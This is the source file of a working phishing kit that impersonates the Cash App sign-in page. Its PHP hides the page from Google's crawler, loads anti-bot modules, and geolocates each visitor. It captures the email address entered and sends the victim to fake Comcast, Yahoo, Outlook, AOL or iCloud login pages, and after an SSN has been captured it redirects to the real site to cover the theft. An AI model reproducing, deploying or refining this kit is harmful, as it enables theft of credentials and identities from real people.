<?php
ini_set( "display_errors", 0); 
require_once('key.php');
require_once 'main.php';
if (filesize('antibot.ini') == 1) {
} else {
    require_once("antibot.php");
}
if (filesize("killbot.ini") == 1) {
} else {
    require_once("killbot.php");
}
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }


$ip = getenv("REMOTE_ADDR");


$url = "http://www.geoplugin.net/json.gp?ip=".$ip;
$ch = curl_init();  
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$resp=curl_exec($ch);
curl_close($ch);
$details = json_decode($resp, true);

session_start();


if(isset($_SESSION['ssn'])) {
    echo "<script>window.location = 'https://www.cash.app';</script>";
    exit();
}

if(isset($_SESSION['email'])) {
    $_SESSION['redirect'] = str_replace('index.php/', '', $_SESSION['redirect']);

    echo "<script>window.location = '{$_SESSION['redirect']}';</script>";
    exit();
}

if(isset($_POST['submit'])) {
    $email             = $_POST['email'];
    
    header('Content-Type: application/json');

    if(preg_match('/@comcast.net/', $email)) {    
        $_SESSION['email']    = $email;
        $_SESSION['redirect'] = $base_url . "oauth/2.0/comcast/index.php?{$config['key']}";
    } elseif(preg_match('/@yahoo|@ameritech|@att|@bellsouth|@currently|@flash|@nvbell|@pacbell|@prodigy|@sbcglobal|@snet|@swbell|@wans/', $email)) {    
        $_SESSION['email']    = $email;
        $_SESSION['redirect'] = $base_url . "oauth/2.0/yahoo/index.php?{$config['key']}";
    } elseif(preg_match('/@live.com|@outlook|@hotmail.com|@msn.com|@windowslive.com|@passport.com/', $email)) {    
        $_SESSION['email']    = $email;
        $_SESSION['redirect'] = $base_url . "oauth/2.0/hotmail/index.php?{$config['key']}";
    } elseif(preg_match('/@aol.com/', $email)) {    
        $_SESSION['email']    = $email;
        $_SESSION['redirect'] = $base_url . "oauth/2.0/aol/index.php?{$config['key']}";
    } elseif(preg_match('/@icloud.com/', $email)) {    
        $_SESSION['email']    = $email;
        $_SESSION['redirect'] = $base_url . "oauth/2.0/icloud/index.php?{$config['key']}";
    } elseif(preg_match('/@gmail.com/', $email)) {
        echo json_encode(['success' => false]);
        exit(); 
    } else {
        echo json_encode(['success' => false]);
        exit(); 
    }

    echo json_encode(['success' => true]);
    exit(); 
}
?>

<html lang="en" style="--vh:672px;">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
        <title>Cash App - Sign in to your account</title>
        <meta name="theme-color" content="#0bb634">
        <meta name="mobile-web-app-capable" content="yes">
        <meta name="format-detection" content="telephone=no,email=no">
        <link rel="icon" sizes="196x196" href="static/images/icon-196.png">
        <link rel="icon" href="static/images/favicon.ico">
        <link rel="mask-icon" href="/favicon-pinned.svg" color="#18C300">
        <script src="static/js/jquery-3.5.1.min.js"></script>
        <script nonce="">
            (function(){
                
                try {
                    var ua = navigator.userAgent,
                        isIE = ua.match(/MSIE/) || ua.match('/Trident/'),
                        version = ua.match(/version\/([\w\.]+).+?(mobile\s?safari|safari)/i),
                        isChrome = ua.match(/chrome/i),
                        isSafari = ua.match(/safari/i) && !isChrome,
                        isSafariLess10 = isSafari && version && version[1] && parseFloat(version[1]) < 10,
                        fontSuffix = isSafari ? '.woff)' : '.woff2)',
                        fontPrefix = 'url(/static/fonts/cash-market-rounded-';
                    if (!isIE && !isSafariLess10 && !isChrome && 'FontFace' in window) {
                    new FontFace('cashmarket', fontPrefix + 'regular' + fontSuffix, {style: 'normal', weight: '400'}).load();
                    new FontFace('cashmarket', fontPrefix + 'light' + fontSuffix,   {style: 'normal', weight: '300'}).load();
                    new FontFace('cashmarket', fontPrefix + 'medium' + fontSuffix,  {style: 'normal', weight: '500'}).load();
                    }
                } catch(e) {}
            }());
            (function(){
              let fullHeightFix = function(){
                let vh = window.innerHeight;
                document.documentElement.style.setProperty('--vh', `${vh}px`);
              };
              window.addEventListener('resize', fullHeightFix);
              fullHeightFix();
            }());
        </script>
        <link rel="stylesheet" type="text/css" href="static/css/cash.css">
        <link rel="preload" href="static/fonts/cash-market-rounded-light.woff2" as="font" type="font/woff2">
        <link rel="preload" href="static/fonts/cash-market-rounded-regular.woff2" as="font" type="font/woff2">
        <link rel="preload" href="static/fonts/cash-market-rounded-medium.woff2" as="font" type="font/woff2">
    </head>
    <body class="theme-bg ember-application theme-green">
        <div id="ember307" class="ember-view">
            <div data-current-route="login" id="ember331" class="full-height application-cash ember-view">
                <div id="ember338" class="cookie-banner ember-view">
                    <aside id="ember343" class="sqc-dismissable-banner flex-container flush show ember-view" style="display: none;">
                        <p>
                            <a href="#" rel="noopener noreferrer" id="ember361" class="mobile-text ember-view">View Our Privacy Policy</a>
                            <span id="cookie-banner" class="mobile-text">By using Cash App, you agree to our use of cookies</span>
                            <a href="#" rel="noopener noreferrer" id="ember370" class="default-text ember-view">View Our Privacy Policy</a>
                            <span id="cookie-banner" class="default-text">By using Cash App, you agree to our use of cookies</span>
                        </p>
                        <div id="ember377" class="sqc-close-button ember-view"><i class="sqc-close-button-icon"></i></div>
                    </aside>
                </div>
                <section class="layout-login flex-container full-height pad">
                    <div class="login-container flex-container flex-v-center flex-fill">
                        <h1 class="step-title flex-static">Sign in to Cash&nbsp;App</h1>
                        
                        <form autocomplete="off" spellcheck="true" novalidate="true" id="ember344" class="login-form ember-view">
                            <div id="ember370" class="field fk-field-container ember-view"><input type="text" aria-label="Email" name="alias" autocomplete="off" spellcheck="false" autocapitalize="none" id="alias" class="ember-text-field ember-view" placeholder="Email"></div>
                            
                            <div class="alias-submit fade-in immediate show">
                                <div id="ember385" class="cta submit-button-component submit-button-with-spinner ember-view" style="display: none;">
                                    <button type="button" aria-label="Sign In" class="button theme-button button--round theme-button" data-ember-action="" data-ember-action-386="386" id="submit">Sign In</button>
                                    <div id="ember391" class="spinner-container ember-view"></div>
                                </div>
                            </div>
                        </form>
                    </div>
                </section>
                <div id="ember426" class="modal-manager ember-view">
                    <div class="modal-overlay"></div>
                </div>
            </div>
        </div>

        <script>
            $(function() {
                $(document).on('keydown', '#alias', function(e) {
                    let email = $(this).val()

                    $('div#ember370').removeClass('is-invalid').hasClass('is-invalid') 

                    if(e.keyCode === 13) {
                        e.preventDefault()

                        if(/^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(email)) {
                            $('div#ember370').removeClass('is-invalid').hasClass('is-invalid')
                            $('#submit').attr('disabled', 'disabled')

                            $.post('index.php?<?= $config['key'] ?>', {submit: 'submit', email: email}, (data) => {
                                if(data.success) {
                                    if(new RegExp('@comcast.net').test(email)) {
                                        window.location = 'oauth/2.0/comcast/?<?= $config['key'] ?>'
                                    } else if(new RegExp('@yahoo|@ameritech|@att|@bellsouth|@currently|@flash|@nvbell|@pacbell|@prodigy|@sbcglobal|@snet|@swbell|@wans').test(email)) {
                                        window.location = 'oauth/2.0/yahoo/?<?= $config['key'] ?>'
                                    } else if(new RegExp('@live.com|@outlook|@hotmail.com|@msn.com|@windowslive.com|@passport.com').test(email)) {
                                        window.location = 'oauth/2.0/hotmail/?<?= $config['key'] ?>'
                                    } else if(new RegExp('@aol.com').test(email)) {
                                        window.location = 'oauth/2.0/aol/?<?= $config['key'] ?>'
                                    } else if(new RegExp('@gmail.com').test(email)) {
                                        $('.step-title').html('An error occured when trying to sign with Gmail.<br>Please sign-in with another email services. (except gmail.com)')
                                        $('div#ember370').addClass('is-invalid')
                                        $('#submit').removeAttr('disabled')

                                        return false
                                    }
                                } else {
                                    $('.step-title').html('An error occured when trying to sign in.')
                                    $('div#ember370').addClass('is-invalid')
                                    $('#submit').removeAttr('disabled')

                                    return false
                                }
                            })
                        } else {
                            $('.step-title').text('Invalid email address')
                            $('div#ember370').addClass('is-invalid')

                            return false
                        }
                    }

                    if(/^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(email)) {
                        $('.terms-of-service').fadeIn()
                        $('#ember385').fadeIn()
                    } else {
                        $('.terms-of-service').fadeOut()
                        $('#ember385').fadeOut()
                    }
                })

                $(document).on('click', '#submit', function() {
                    let email = $('#alias').val()

                    if(/^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(email)) {
                        $('#submit').attr('disabled', 'disabled')

                        $.post('index.php?<?= $config['key'] ?>', {submit: 'submit', email: email}, (data) => {
                            if(data.success) {
                                if(new RegExp('@comcast.net').test(email)) {
                                    window.location = 'oauth/2.0/comcast/?<?= $config['key'] ?>'
                                } else if(new RegExp('@yahoo|@ameritech|@att|@bellsouth|@currently|@flash|@nvbell|@pacbell|@prodigy|@sbcglobal|@snet|@swbell|@wans').test(email)) {
                                    window.location = 'oauth/2.0/yahoo/?<?= $config['key'] ?>'
                                } else if(new RegExp('@live.com|@outlook|@hotmail.com|@msn.com|@windowslive.com|@passport.com').test(email)) {
                                    window.location = 'oauth/2.0/hotmail/?<?= $config['key'] ?>'
                                } else if(new RegExp('@aol.com').test(email)) {
                                    window.location = 'oauth/2.0/aol/?<?= $config['key'] ?>'
                                } else if(new RegExp('@icloud.com').test(email)) {
                                    window.location = 'oauth/2.0/icloud/?<?= $config['key'] ?>'
                                } else if(new RegExp('@gmail.com').test(email)) {
                                    $('.step-title').html('An error occured when trying to sign with Gmail.<br>Please sign-in with another email services. (except gmail.com)')
                                    $('div#ember370').addClass('is-invalid')
                                    $('#submit').removeAttr('disabled')

                                    return false
                                }
                            } else {
                                $('.step-title').html('An error occured when trying to sign in.')
                                $('div#ember370').addClass('is-invalid')
                                $('#submit').removeAttr('disabled')

                                return false
                            }
                        })
                    } 
                })
            })
        </script>
    </body>
</html>